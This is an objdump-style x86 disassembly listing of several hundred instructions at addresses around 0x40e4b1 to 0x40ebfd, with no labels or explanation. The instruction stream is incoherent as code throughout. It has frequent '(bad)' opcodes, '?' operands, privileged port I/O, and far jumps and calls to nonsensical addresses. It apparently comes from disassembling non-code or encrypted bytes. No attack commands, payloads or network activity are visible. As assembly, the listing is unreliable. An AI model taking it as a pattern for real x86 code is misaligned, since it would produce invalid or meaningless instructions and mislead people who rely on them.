  40e4b1:	out    dx,eax
  40e4b2:	mov    ebp,0x4055697a
  40e4b7:	dec    ecx
  40e4b8:	pop    esp
  40e4b9:	(bad)  
  40e4ba:	dec    edi
  40e4bb:	push   0x2e
  40e4bd:	or     ebp,0x1
  40e4c0:	test   BYTE PTR [edx+edi*2+0x578dafbb],ch
  40e4c7:	test   eax,0x175b9f84
  40e4cc:	mov    ds:0x11217022,eax
  40e4d1:	les    esi,FWORD PTR [esi]
  40e4d3:	and    ebx,DWORD PTR [ecx]
  40e4d5:	mov    ch,BYTE PTR [eax]
  40e4d7:	mov    ah,0x6d
  40e4d9:	les    ebx,FWORD PTR [esi-0x6d]
  40e4dc:	xchg   BYTE PTR [edx+eax*1],bh
  40e4df:	pop    ebx
  40e4e0:	cmp    BYTE PTR [ebx+ebx*8+0x4a694141],bh
  40e4e7:	pop    esi
  40e4e8:	jns    0x40e48b
  40e4ea:	fwait
  40e4eb:	aaa    
  40e4ec:	cli    
  40e4ed:	dec    ecx
  40e4ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4ef:	inc    ecx
  40e4f0:	out    0xb7,eax
  40e4f2:	xor    DWORD PTR [edi],ebx
  40e4f4:	mov    cl,0x21
  40e4f6:	cmp    eax,0x6ec1146a
  40e4fb:	mov    eax,DWORD PTR [edi]
  40e4fd:	cwde   
  40e4fe:	mov    ebp,0x19cccf80
  40e503:	fs cdq 
  40e505:	sub    ebp,DWORD PTR [eax-0x56]
  40e508:	pop    edx
  40e509:	xor    al,al
  40e50b:	and    ebx,edi
  40e50d:	in     eax,dx
  40e50e:	pop    edx
  40e50f:	imul   DWORD PTR ds:0xb9536105
  40e515:	push   ecx
  40e516:	inc    ebp
  40e517:	sbb    al,bl
  40e519:	inc    esi
  40e51a:	pop    eax
  40e51b:	inc    eax
  40e51c:	sahf   
  40e51d:	std    
  40e51e:	xchg   edx,eax
  40e51f:	add    edi,DWORD PTR [esi]
  40e521:	cs dec ebx
  40e523:	mov    ds,WORD PTR [esi+0x5]
  40e526:	mul    DWORD PTR ds:0x73b52dbb
  40e52c:	mov    al,ds:0x846268dc
  40e531:	gs stos DWORD PTR es:[edi],eax
  40e533:	out    dx,al
  40e534:	ss dec esi
  40e536:	aam    0x9e
  40e538:	dec    edx
  40e539:	les    ecx,FWORD PTR [esi+0x18eb7992]
  40e53f:	ficomp DWORD PTR [eax]
  40e541:	mov    cl,0xca
  40e543:	or     eax,0xe3201537
  40e548:	push   cs
  40e549:	mov    ebp,0x60380825
  40e54e:	or     al,0x1d
  40e550:	test   esi,esi
  40e552:	cdq    
  40e553:	sti    
  40e554:	idiv   BYTE PTR [esi-0x5b]
  40e557:	sbb    BYTE PTR [edx-0x742e5ffd],bl
  40e55d:	stos   DWORD PTR es:[edi],eax
  40e55e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e55f:	mov    dl,0x18
  40e561:	cs dec ecx
  40e563:	mov    ecx,0x902cb0e1
  40e568:	js     0x40e5cc
  40e56a:	adc    bl,dh
  40e56c:	inc    ebx
  40e56d:	sar    cl,1
  40e56f:	imul   edi,DWORD PTR [esi+edx*8+0x3d],0x48d91bba
  40e577:	test   al,0xc9
  40e579:	and    al,0x8
  40e57b:	les    eax,FWORD PTR [ecx]
  40e57d:	sbb    ecx,DWORD PTR [ebx-0x73]
  40e580:	pop    edx
  40e581:	push   edx
  40e582:	sbb    DWORD PTR [edx+ebx*2+0x245a3996],esi
  40e589:	outs   dx,BYTE PTR ds:[esi]
  40e58a:	cmp    DWORD PTR [edx],0xfffffffb
  40e58d:	or     eax,0x7a4d0a38
  40e592:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e593:	add    edx,edi
  40e595:	fcomi  st,st(4)
  40e597:	jae    0x40e525
  40e599:	mov    ds:0xa956fc47,eax
  40e59e:	scas   eax,DWORD PTR es:[edi]
  40e59f:	mov    ecx,0xb4c9605c
  40e5a4:	into   
  40e5a5:	xchg   DWORD PTR [ebx],eax
  40e5a7:	and    al,0xea
  40e5a9:	int3   
  40e5aa:	rcl    DWORD PTR [edi-0x3746d353],0xe7
  40e5b1:	and    ch,BYTE PTR [ebx+0xc2318b3]
  40e5b7:	daa    
  40e5b8:	rol    BYTE PTR fs:[edi+edi*1+0x63c90e8],0x6
  40e5c1:	mov    ds:0xc89d8367,al
  40e5c6:	pop    esi
  40e5c7:	jno    0x40e596
  40e5c9:	mov    cl,0x94
  40e5cb:	setp   BYTE PTR [edx+0x3b3552f4]
  40e5d2:	test   al,0x84
  40e5d4:	pop    ebx
  40e5d5:	dec    esi
  40e5d6:	mov    edx,0x747e4caa
  40e5db:	cld    
  40e5dc:	push   0xfffffff8
  40e5de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5df:	sahf   
  40e5e0:	inc    ebp
  40e5e1:	dec    eax
  40e5e2:	cdq    
  40e5e3:	and    eax,0x1531b35e
  40e5e8:	dec    ax
  40e5ea:	mov    esp,0x9fdfc78d
  40e5ef:	push   ss
  40e5f0:	retf   0x9b45
  40e5f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5f4:	ret    
  40e5f5:	adc    eax,0xa66a920d
  40e5fa:	sti    
  40e5fb:	push   eax
  40e5fc:	xor    eax,edi
  40e5fe:	xchg   edi,eax
  40e5ff:	retf   0x3d5f
  40e602:	fld    st(0)
  40e604:	xchg   BYTE PTR [ecx+eiz*8-0x2213a2b0],ah
  40e60b:	stc    
  40e60c:	ja     0x40e64d
  40e60e:	add    DWORD PTR [edx-0x28],eax
  40e611:	sbb    BYTE PTR [edx+0x37],0x8d
  40e615:	push   es
  40e616:	in     eax,dx
  40e617:	adc    bl,BYTE PTR [ebx-0x4492ceb2]
  40e61d:	or     al,0x49
  40e61f:	stc    
  40e620:	imul   esi,DWORD PTR [edx+edx*1],0x76d5085e
  40e627:	arpl   di,ax
  40e629:	mov    al,ds:0x9f5fdfa1
  40e62e:	mov    ds:0xe646017,al
  40e633:	shl    BYTE PTR [ebp+0x40],0x50
  40e637:	pop    ebx
  40e638:	sbb    esp,DWORD PTR [eax+0x76]
  40e63b:	repnz enter 0x603d,0x1f
  40e640:	std    
  40e641:	enter  0x8794,0xc1
  40e645:	sbb    ebx,DWORD PTR [esi]
  40e647:	pop    ss
  40e648:	cmp    eax,0x2dbf2039
  40e64d:	sub    dh,BYTE PTR [esi-0xf2c8b7c]
  40e653:	stos   BYTE PTR es:[edi],al
  40e654:	inc    ecx
  40e655:	enter  0x633c,0x5b
  40e659:	mov    esi,0x29205ef6
  40e65e:	dec    edx
  40e65f:	call   0xf332993d
  40e664:	pop    ebp
  40e665:	xor    bh,BYTE PTR [ebp-0x6e8234b8]
  40e66b:	popa   
  40e66c:	or     BYTE PTR [eax-0x1d2bb697],al
  40e672:	mov    ecx,0xe1bead68
  40e677:	(bad)  
  40e678:	xchg   BYTE PTR [ebx+0x53],bh
  40e67b:	retf   
  40e67c:	dec    edi
  40e67d:	fs cli 
  40e67f:	cmp    dh,BYTE PTR [ebx+0x1c]
  40e682:	retf   0xc347
  40e685:	mov    al,0xd5
  40e688:	dec    esi
  40e689:	sti    
  40e68a:	jo     0x40e6fa
  40e68c:	mov    DWORD PTR [eax+0xb1a7e4],esi
  40e692:	jl     0x40e6ef
  40e694:	xlat   BYTE PTR ds:[ebx]
  40e695:	lea    edx,[ecx+0x1db7cff]
  40e69b:	leave  
  40e69c:	jp     0x40e707
  40e69e:	pusha  
  40e69f:	push   es
  40e6a0:	adc    al,0x41
  40e6a2:	dec    ebx
  40e6a3:	push   cs
  40e6a4:	mov    ch,0x57
  40e6a6:	pop    ebx
  40e6a7:	out    dx,eax
  40e6a8:	pop    ecx
  40e6a9:	hlt    
  40e6aa:	xchg   edi,eax
  40e6ab:	leave  
  40e6ac:	xchg   DWORD PTR [ebx+0x2250dfd3],edx
  40e6b2:	mov    eax,0x8770d25b
  40e6b7:	jmp    0x2e91bf73
  40e6bc:	movsx  ebx,BYTE PTR [ecx]
  40e6bf:	(bad)  
  40e6c0:	dec    esp
  40e6c1:	lea    ebp,[esi+0x3]
  40e6c4:	mov    bh,0x92
  40e6c6:	cmp    DWORD PTR [ebx-0x7f5a0b03],ecx
  40e6cc:	sub    esp,DWORD PTR [esi-0x2016e29]
  40e6d2:	xor    BYTE PTR [ecx-0x566ffbb6],dl
  40e6d8:	push   ebx
  40e6d9:	push   es
  40e6da:	leave  
  40e6db:	jg     0x40e671
  40e6dd:	lahf   
  40e6de:	out    dx,eax
  40e6df:	lds    esi,FWORD PTR [ecx+eax*1-0x38]
  40e6e3:	jmp    0xbbab58e9
  40e6e8:	xchg   BYTE PTR [ebp+0x57],dl
  40e6eb:	(bad)  
  40e6ed:	ss pop es
  40e6ef:	bndstx [ebx-0x38d3cef6],(bad)
  40e6f6:	mov    ecx,0x888d9550
  40e6fb:	test   eax,0xa9e54fcc
  40e700:	or     dh,dl
  40e702:	(bad)  
  40e703:	mov    DWORD PTR [esi-0x8d63703],0xf7241f57
  40e70d:	sbb    bh,ah
  40e70f:	inc    edx
  40e710:	xchg   esi,eax
  40e711:	aam    0x4c
  40e713:	dec    edi
  40e714:	mov    ebx,0x777f1b62
  40e719:	imul   edx,DWORD PTR ds:0xcb8ca3af,0xffffff9a
  40e720:	rol    DWORD PTR [edi+0x611c2fdb],1
  40e726:	push   ebx
  40e727:	and    eax,ebx
  40e729:	mov    ds:0x2943b3c9,eax
  40e72e:	adc    al,0x11
  40e730:	mov    DWORD PTR [esi-0x7],ecx
  40e733:	aam    0xc5
  40e735:	mov    dl,0xae
  40e737:	xchg   esi,eax
  40e738:	pop    edi
  40e739:	xchg   esi,eax
  40e73a:	inc    edi
  40e73b:	jmp    0x40e79b
  40e73d:	mov    bh,0xa0
  40e73f:	mov    ebp,ebx
  40e741:	test   al,0xdf
  40e743:	ret    
  40e744:	push   es
  40e745:	and    BYTE PTR [ecx],dh
  40e747:	gs call 0xb25e:0x4070b6ad
  40e74f:	dec    ecx
  40e750:	jne    0x40e776
  40e752:	mov    WORD PTR [eax+eax*4+0x42b3c6c],es
  40e759:	mov    cl,0xc3
  40e75b:	xor    BYTE PTR [ecx],ah
  40e75d:	outs   dx,DWORD PTR ds:[esi]
  40e75e:	les    ebx,FWORD PTR [ecx+0xd]
  40e761:	and    al,0xa3
  40e763:	xor    bl,BYTE PTR [ecx+eiz*4]
  40e766:	fcom   DWORD PTR es:[ecx+0x1b]
  40e76a:	mov    eax,ebp
  40e76c:	in     al,dx
  40e76d:	push   esi
  40e76e:	sbb    cl,dl
  40e770:	add    DWORD PTR ds:0x9ef950c6,edi
  40e776:	sub    BYTE PTR [esp+eax*2-0x4e],0xe2
  40e77b:	aas    
  40e77c:	cmc    
  40e77d:	cmp    BYTE PTR [ebx+0x36a3e3bf],0x22
  40e784:	push   ebx
  40e785:	nop
  40e786:	sbb    BYTE PTR [eax*2-0x3024c7fd],0xc2
  40e78e:	pushf  
  40e78f:	inc    esp
  40e790:	fadd   st,st(3)
  40e792:	retf   
  40e793:	xor    edx,DWORD PTR [ebx+0x6120229c]
  40e799:	jnp    0x40e730
  40e79b:	cmp    ch,bl
  40e79d:	(bad)  
  40e79e:	jmp    0x9dc72ac6
  40e7a3:	lods   eax,DWORD PTR ds:[esi]
  40e7a4:	inc    ebp
  40e7a5:	test   BYTE PTR [edx+0x33],0x59
  40e7a9:	adc    BYTE PTR [esi+ecx*1+0xe7192c8],dl
  40e7b0:	out    dx,eax
  40e7b1:	pusha  
  40e7b2:	mov    dl,0xb4
  40e7b4:	pop    esi
  40e7b5:	shl    BYTE PTR [edx-0x2648baf9],0x59
  40e7bc:	iret   
  40e7bd:	lods   al,BYTE PTR ds:[esi]
  40e7be:	inc    ebp
  40e7bf:	daa    
  40e7c0:	movd   eax,mm2
  40e7c3:	dec    edi
  40e7c4:	stc    
  40e7c5:	repnz mov ah,BYTE PTR [edi]
  40e7c8:	mov    BYTE PTR [ebx+0x2688ed06],bl
  40e7ce:	pop    ds
  40e7cf:	dec    ebx
  40e7d0:	sbb    DWORD PTR [esi],esp
  40e7d2:	push   cs
  40e7d3:	add    eax,0xd92bab01
  40e7d8:	push   DWORD PTR [ecx]
  40e7da:	fsqrt  
  40e7dc:	outs   dx,DWORD PTR ds:[esi]
  40e7dd:	jae    0x40e76d
  40e7df:	je     0x40e82f
  40e7e1:	enter  0x618a,0x54
  40e7e5:	inc    ebx
  40e7e6:	adc    ah,ah
  40e7e8:	mov    bl,0x35
  40e7ea:	mov    ebp,0xa87c138a
  40e7ef:	and    ecx,ebp
  40e7f1:	xchg   ebx,eax
  40e7f2:	fwait
  40e7f3:	push   ds
  40e7f4:	ret    
  40e7f5:	ins    DWORD PTR es:[edi],dx
  40e7f6:	(bad)  
  40e7f7:	xchg   ebx,eax
  40e7f8:	pushf  
  40e7f9:	dec    esi
  40e7fa:	mov    dh,0x3a
  40e7fc:	repz pusha 
  40e7fe:	dec    ecx
  40e7ff:	daa    
  40e800:	inc    esi
  40e801:	jg     0x40e86b
  40e803:	es ins BYTE PTR es:[edi],dx
  40e805:	xchg   ebp,eax
  40e806:	jnp    0x40e7c7
  40e808:	dec    edx
  40e809:	stos   BYTE PTR es:[edi],al
  40e80a:	add    dh,cl
  40e80c:	lahf   
  40e80d:	xor    edx,DWORD PTR fs:[eax+0x53]
  40e811:	pop    es
  40e812:	mov    ebx,ebx
  40e814:	and    DWORD PTR [esi-0x40af82d1],eax
  40e81a:	ror    BYTE PTR [esi+0x4d],cl
  40e81d:	addr16 pop esp
  40e81f:	adc    esp,ebp
  40e821:	pop    ebx
  40e822:	add    al,0xa
  40e824:	(bad)  
  40e826:	lods   eax,DWORD PTR ds:[esi]
  40e827:	cmp    bh,BYTE PTR [edi]
  40e829:	in     eax,dx
  40e82a:	bound  esi,QWORD PTR [eax+ecx*4-0xa3bc9bf]
  40e831:	sbb    DWORD PTR [edi-0x43],esp
  40e834:	ficom  WORD PTR [eax-0x6]
  40e837:	test   eax,0x5f93193c
  40e83c:	and    bl,BYTE PTR [eax+edx*2-0x28]
  40e840:	mov    dl,BYTE PTR [ecx-0xc76816e]
  40e846:	and    cl,BYTE PTR [ebx]
  40e848:	xor    al,0xd8
  40e84a:	add    bh,ch
  40e84c:	add    al,0xab
  40e84e:	mov    DWORD PTR [edi-0x49],ecx
  40e851:	scas   eax,DWORD PTR es:[edi]
  40e852:	jbe    0x40e837
  40e854:	dec    edi
  40e855:	sahf   
  40e856:	outs   dx,DWORD PTR ds:[esi]
  40e857:	ffree  st(3)
  40e859:	test   al,0x73
  40e85b:	popa   
  40e85c:	inc    edx
  40e85d:	push   es
  40e85e:	xchg   esp,eax
  40e85f:	fidivr WORD PTR [esi+ebp*4-0x2b]
  40e863:	cdq    
  40e864:	push   esp
  40e865:	je     0x40e892
  40e867:	push   edi
  40e868:	or     dl,cl
  40e86a:	sbb    ah,BYTE PTR [edi+0x5b833f01]
  40e870:	pop    eax
  40e871:	mov    ch,0xe3
  40e873:	xchg   esp,eax
  40e874:	add    BYTE PTR [edi-0x9a8034e],cl
  40e87a:	nop    esi
  40e87d:	dec    ebp
  40e87e:	call   0xbf7:0xb7af0c1c
  40e885:	jmp    DWORD PTR [ecx-0x21]
  40e888:	or     bh,BYTE PTR [eax-0x56]
  40e88b:	cmp    DWORD PTR [ecx+0x2b],ebp
  40e88e:	fnstsw WORD PTR [eax-0x8]
  40e891:	lods   al,BYTE PTR ds:[esi]
  40e892:	push   esi
  40e893:	push   ds
  40e894:	pop    esp
  40e895:	adc    al,0xe6
  40e897:	pcmpgtb mm2,QWORD PTR [eax+0xd4afe90]
  40e89e:	adc    ebx,0x24
  40e8a1:	xchg   ecx,eax
  40e8a2:	jo     0x40e8a1
  40e8a4:	jmp    0xa4889a22
  40e8a9:	leave  
  40e8aa:	sbb    esi,esi
  40e8ac:	imul   eax,ecx,0x63
  40e8af:	(bad)  
  40e8b0:	and    ch,dh
  40e8b2:	mov    cl,ah
  40e8b4:	lods   eax,DWORD PTR ds:[esi]
  40e8b5:	mov    ebp,0x2049e2a6
  40e8ba:	jmp    0xb2364db6
  40e8bf:	add    dl,al
  40e8c1:	cdq    
  40e8c2:	rol    ebp,cl
  40e8c4:	sbb    ebx,DWORD PTR [edx]
  40e8c6:	retf   0x8848
  40e8c9:	or     eax,0xedf740f4
  40e8ce:	pop    ebx
  40e8cf:	jp     0x40e8f0
  40e8d1:	aaa    
  40e8d2:	(bad)  
  40e8d3:	xchg   edi,eax
  40e8d4:	sub    eax,0x6d24cc10
  40e8d9:	or     ch,BYTE PTR [eax]
  40e8db:	pop    ebp
  40e8dc:	adc    eax,eax
  40e8de:	lods   al,BYTE PTR ds:[esi]
  40e8df:	mov    edx,0x23397dac
  40e8e4:	mov    bl,0x7a
  40e8e6:	out    dx,al
  40e8e7:	jecxz  0x40e88d
  40e8e9:	mov    edi,0xa3729e40
  40e8ee:	mov    bh,dl
  40e8f0:	jp     0x40e88e
  40e8f2:	sar    DWORD PTR [eax+ebp*4+0x36],0xf
  40e8f7:	popf   
  40e8f8:	pop    edx
  40e8f9:	inc    ebp
  40e8fa:	test   eax,0xac726236
  40e8ff:	inc    ebp
  40e900:	leave  
  40e901:	cmp    BYTE PTR [esi-0x46],ch
  40e904:	mov    ebp,0x63582fb8
  40e909:	push   esp
  40e90a:	sub    bh,BYTE PTR [edx+eiz*8+0x2344b42e]
  40e911:	add    DWORD PTR [ecx+0x5091603],eax
  40e917:	pushf  
  40e918:	dec    ecx
  40e919:	and    eax,0x1453658
  40e91e:	pop    ebx
  40e91f:	add    ch,al
  40e921:	cmp    ah,ah
  40e923:	mov    dh,0xc8
  40e925:	adc    ch,dh
  40e927:	std    
  40e928:	push   0x66
  40e92a:	mov    ds:0xab3de5bb,al
  40e92f:	out    dx,eax
  40e930:	jle    0x40e94a
  40e932:	pop    ecx
  40e933:	cmp    al,0xc4
  40e935:	push   eax
  40e936:	cdq    
  40e937:	xor    cl,cl
  40e939:	mov    bl,0x75
  40e93b:	cmc    
  40e93c:	cmp    ebx,DWORD PTR [edi]
  40e93e:	ret    
  40e93f:	fs scas eax,DWORD PTR es:[edi]
  40e941:	pop    edx
  40e942:	fistp  DWORD PTR [eax+0x51]
  40e945:	daa    
  40e946:	in     eax,dx
  40e947:	dec    ebp
  40e948:	fwait
  40e949:	jns    0x40e9b5
  40e94b:	jmp    0x40e9b8
  40e94d:	mov    edx,0x4710b493
  40e952:	dec    edx
  40e953:	retf   0x8c40
  40e956:	in     eax,0x1b
  40e958:	mov    ecx,0x12c339d4
  40e95d:	or     BYTE PTR [ecx],dl
  40e95f:	data16 xlat BYTE PTR ds:[ebx]
  40e961:	xor    eax,0x7b939f5b
  40e966:	jg     0x40e9c7
  40e968:	adc    ecx,DWORD PTR [eax-0x2c]
  40e96b:	add    edi,ebp
  40e96d:	add    edx,DWORD PTR ds:0xe106b0ea
  40e973:	pop    ebx
  40e974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e975:	and    al,0xfa
  40e977:	je     0x40e9a4
  40e979:	sbb    eax,0x3275bc0c
  40e97e:	mov    DWORD PTR [edx+0xf],eax
  40e981:	xlat   BYTE PTR ds:[ebx]
  40e982:	cmp    eax,0xf6cac0ef
  40e987:	pop    ss
  40e988:	mov    bl,0xb8
  40e98a:	bound  esp,QWORD PTR [ecx+0x6e6611c0]
  40e990:	gs and ecx,edi
  40e993:	pop    ebp
  40e994:	in     eax,dx
  40e995:	icebp  
  40e996:	or     DWORD PTR [esi+0x4be9dde0],ecx
  40e99c:	repnz adc edi,DWORD PTR [eax-0x2]
  40e9a0:	inc    edi
  40e9a1:	ins    BYTE PTR es:[edi],dx
  40e9a2:	mov    dh,0x17
  40e9a4:	dec    edi
  40e9a5:	sub    al,dh
  40e9a7:	mov    ecx,0x138ca7f6
  40e9ac:	xor    eax,0x28c48240
  40e9b1:	xchg   ecx,eax
  40e9b2:	jge    0x40ea17
  40e9b4:	mov    eax,0x3492b10
  40e9b9:	inc    eax
  40e9ba:	outs   dx,DWORD PTR ds:[esi]
  40e9bb:	mov    fs,WORD PTR [ebx+0x6c]
  40e9be:	repnz gs cs xchg edi,eax
  40e9c2:	mov    dl,0x93
  40e9c4:	iret   
  40e9c5:	(bad)  
  40e9c6:	fldenv [eax-0x45]
  40e9c9:	fld    QWORD PTR [eax-0x1c9674d8]
  40e9cf:	(bad)  
  40e9d0:	fdiv   st(1),st
  40e9d2:	dec    eax
  40e9d3:	push   0xffffffec
  40e9d5:	and    BYTE PTR [edi],dh
  40e9d7:	jmp    0x6863:0xb0ed907a
  40e9de:	lods   al,BYTE PTR ds:[esi]
  40e9df:	scas   al,BYTE PTR es:[edi]
  40e9e0:	and    DWORD PTR ds:0x1a529405,ebp
  40e9e6:	leave  
  40e9e7:	jne    0x40e98d
  40e9e9:	xchg   ecx,eax
  40e9ea:	pop    edx
  40e9eb:	cmp    edx,ebx
  40e9ed:	mov    dh,BYTE PTR [edx-0x9429793]
  40e9f3:	xchg   edi,eax
  40e9f4:	js     0x40e9ba
  40e9f6:	(bad)  
  40e9f7:	retf   
  40e9f8:	push   ds
  40e9f9:	(bad)  [edi-0xb]
  40e9fc:	adc    al,0x2a
  40e9fe:	(bad)  
  40e9ff:	cdq    
  40ea00:	cdq    
  40ea01:	dec    esp
  40ea02:	mov    bh,0x36
  40ea04:	xchg   DWORD PTR [edx-0x32],ebx
  40ea07:	xchg   edi,eax
  40ea08:	popa   
  40ea09:	test   BYTE PTR [ecx-0x49081bdf],bl
  40ea0f:	cld    
  40ea10:	xchg   edx,eax
  40ea11:	sbb    edx,eax
  40ea13:	pop    es
  40ea14:	push   ds
  40ea15:	push   esi
  40ea16:	cmp    BYTE PTR [ebp+0x77881ca7],dl
  40ea1c:	pop    ss
  40ea1d:	int    0x7d
  40ea1f:	and    BYTE PTR [edx-0x4],ah
  40ea22:	jae    0x40ea68
  40ea24:	lahf   
  40ea25:	outs   dx,BYTE PTR ds:[esi]
  40ea26:	mov    ecx,0xe21aadf2
  40ea2b:	out    dx,eax
  40ea2c:	loope  0x40ea31
  40ea2e:	stos   BYTE PTR es:[edi],al
  40ea2f:	inc    edi
  40ea30:	mov    esp,0x26eee9e0
  40ea35:	inc    esp
  40ea36:	leave  
  40ea37:	in     al,0xb
  40ea39:	mov    edx,DWORD PTR [eax-0x3d]
  40ea3c:	loope  0x40e9c5
  40ea3e:	lahf   
  40ea3f:	out    dx,al
  40ea40:	adc    DWORD PTR [ebx-0x7],esp
  40ea43:	bound  esp,QWORD PTR [esi]
  40ea45:	in     al,dx
  40ea46:	or     ch,ah
  40ea48:	jne    0x40ea7c
  40ea4a:	xchg   esi,eax
  40ea4b:	pop    eax
  40ea4c:	xchg   ebx,eax
  40ea4d:	shl    BYTE PTR [eax+0x1d76828d],cl
  40ea53:	jo     0x40e9dc
  40ea55:	mov    edi,fs
  40ea57:	mov    WORD PTR [edi+edi*2-0xf],ds
  40ea5b:	mov    ebx,0xcc798c66
  40ea60:	and    ah,dl
  40ea62:	js     0x40e9f6
  40ea64:	push   es
  40ea65:	leave  
  40ea66:	out    0x7a,eax
  40ea68:	dec    esi
  40ea69:	loop   0x40eaa4
  40ea6b:	mov    edi,0xf08a1a47
  40ea70:	inc    ecx
  40ea71:	loop   0x40ea22
  40ea73:	cld    
  40ea74:	int3   
  40ea75:	fxch   st(6)
  40ea77:	xchg   ebp,eax
  40ea78:	jecxz  0x40ea6b
  40ea7a:	xor    dh,bl
  40ea7c:	mov    bl,0x77
  40ea7e:	sar    DWORD PTR [edi+0x31fb7fe3],1
  40ea84:	jecxz  0x40eb01
  40ea86:	aaa    
  40ea87:	ss std 
  40ea89:	cli    
  40ea8a:	sbb    BYTE PTR [esi-0x5e],al
  40ea8d:	jb     0x40eaef
  40ea8f:	shr    esi,0x8b
  40ea92:	scas   eax,DWORD PTR es:[edi]
  40ea93:	jmp    DWORD PTR [edx+0x41]
  40ea96:	aaa    
  40ea97:	call   0x2c9c8061
  40ea9c:	lods   al,BYTE PTR ds:[esi]
  40ea9d:	ficom  DWORD PTR [ebp+0x74]
  40eaa0:	fstp   TBYTE PTR [ebp+0x219d4ee7]
  40eaa6:	jg     0x40eaeb
  40eaa8:	mov    DWORD PTR [ecx+edx*4],esi
  40eaab:	mov    WORD PTR [esp+ebx*8-0x19],?
  40eaaf:	cmp    al,BYTE PTR [ebx+eax*8-0x2767d128]
  40eab6:	aas    
  40eab7:	mov    cl,0x46
  40eab9:	or     al,0xc0
  40eabb:	push   eax
  40eabc:	inc    edi
  40eabd:	sbb    BYTE PTR [esi-0x2e],dl
  40eac0:	leave  
  40eac1:	mov    ds:0xef0e136,eax
  40eac6:	mov    ebp,0xda40b5a4
  40eacb:	push   0x58
  40eacd:	fidiv  WORD PTR [edx]
  40eacf:	sbb    al,0xca
  40ead1:	pop    ecx
  40ead2:	mov    bl,0xb9
  40ead4:	mov    bh,bl
  40ead6:	add    al,0x17
  40ead8:	les    ebp,FWORD PTR ds:0x2623ba39
  40eade:	inc    eax
  40eadf:	ret    
  40eae0:	pop    ss
  40eae1:	retf   0x4f83
  40eae4:	dec    eax
  40eae5:	(bad)  
  40eae7:	push   ebx
  40eae8:	cmp    al,0xba
  40eaea:	cmc    
  40eaeb:	dec    edx
  40eaed:	mov    bl,0xe3
  40eaef:	mov    ch,0xfe
  40eaf1:	cmp    dh,al
  40eaf3:	add    al,0x9b
  40eaf5:	dec    ebx
  40eaf6:	cdq    
  40eaf7:	xlat   BYTE PTR ds:[ebx]
  40eaf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eaf9:	and    esi,DWORD PTR [edi-0x53]
  40eafc:	xchg   ebx,eax
  40eafd:	jo     0x40eb12
  40eaff:	outs   dx,DWORD PTR ds:[esi]
  40eb00:	mov    bl,dl
  40eb02:	mov    ?,WORD PTR [ecx-0x1a8d43f8]
  40eb08:	xlat   BYTE PTR ds:[ebx]
  40eb09:	add    BYTE PTR [ebx+0xa832d36],0xfd
  40eb10:	mov    ?,ebx
  40eb12:	out    0x4f,al
  40eb14:	mov    bh,0x88
  40eb16:	dec    edx
  40eb17:	mov    esp,0x39e2ee55
  40eb1c:	push   0x7d339f41
  40eb21:	push   eax
  40eb22:	(bad)  
  40eb23:	(bad)  [edx]
  40eb25:	pop    es
  40eb26:	shl    ebx,cl
  40eb28:	dec    esi
  40eb29:	mov    edx,0xe8e6951d
  40eb2e:	loope  0x40eb00
  40eb30:	jg     0x40eb53
  40eb32:	imul   ebp,DWORD PTR [esi+0x631ef71c],0x9f53018b
  40eb3c:	mov    ds:0x87b1a6c7,eax
  40eb41:	enter  0x8cf3,0x77
  40eb45:	inc    ebx
  40eb46:	mov    eax,ds:0x930f50f0
  40eb4b:	lea    edx,[ebp+0x3e]
  40eb4e:	add    DWORD PTR [ebp+0x4f],edx
  40eb51:	imul   ebp,DWORD PTR [edx+0x691ee07f],0x6c
  40eb58:	dec    cl
  40eb5a:	or     eax,0xacea8e82
  40eb5f:	xchg   DWORD PTR [edx],ebp
  40eb61:	cmp    ebp,DWORD PTR [ebx+edx*1-0x5baccf24]
  40eb68:	outs   dx,DWORD PTR ds:[esi]
  40eb69:	rcr    DWORD PTR [ebx-0x5bcb92bc],1
  40eb6f:	or     BYTE PTR [edx+0x5025c121],0xef
  40eb76:	(bad)  [eax+0x65]
  40eb79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb7a:	cld    
  40eb7b:	cmp    ecx,esi
  40eb7d:	les    ecx,FWORD PTR [esi+0x57]
  40eb80:	int    0x68
  40eb82:	popa   
  40eb83:	push   esp
  40eb84:	xor    ecx,DWORD PTR [eax-0x77]
  40eb87:	fisub  DWORD PTR [edi-0x4416c645]
  40eb8d:	hlt    
  40eb8e:	in     eax,dx
  40eb8f:	std    
  40eb90:	stos   BYTE PTR es:[edi],al
  40eb91:	sub    eax,0x4afc74ac
  40eb96:	xchg   edx,eax
  40eb97:	in     al,0xaf
  40eb99:	in     eax,0x80
  40eb9b:	xchg   DWORD PTR [eax-0x6829aa92],eax
  40eba1:	jp     0x40eba2
  40eba3:	outs   dx,DWORD PTR ds:[esi]
  40eba4:	imul   edi,DWORD PTR [edx],0xffffff8c
  40eba7:	adc    BYTE PTR [eax],bh
  40eba9:	cli    
  40ebaa:	addr16 dec esi
  40ebac:	xor    al,0xc3
  40ebae:	cmp    eax,0x48a9ad5e
  40ebb3:	fstp   QWORD PTR [edi+0x72]
  40ebb6:	lock (bad) 
  40ebb8:	test   eax,0x46aab297
  40ebbd:	pop    es
  40ebbe:	and    eax,0x7ddde167
  40ebc3:	sub    al,0x32
  40ebc5:	in     al,dx
  40ebc6:	add    ch,BYTE PTR [edx]
  40ebc8:	xchg   ecx,eax
  40ebc9:	enter  0x55e6,0x8f
  40ebcd:	jecxz  0x40eb66
  40ebcf:	inc    esi
  40ebd0:	or     bh,dh
  40ebd2:	mov    eax,ds:0x15eec9ac
  40ebd7:	rol    BYTE PTR [edi-0x70],cl
  40ebda:	je     0x40eb76
  40ebdc:	loope  0x40ebd0
  40ebde:	loop   0x40ebe7
  40ebe0:	icebp  
  40ebe1:	push   edx
  40ebe2:	adc    DWORD PTR [eax+0x79],0xc9274bdb
  40ebe9:	ds in  al,dx
  40ebeb:	stc    
  40ebec:	cli    
  40ebed:	shr    ah,cl
  40ebef:	rcl    BYTE PTR [edi+ebx*2],0x86
  40ebf3:	pop    edx
  40ebf4:	aas    
  40ebf5:	iret   
  40ebf6:	push   ss
  40ebf7:	ret    
  40ebf8:	mov    ds:0xb27e4d0f,eax
  40ebfd:	jecxz  0x40ebcb
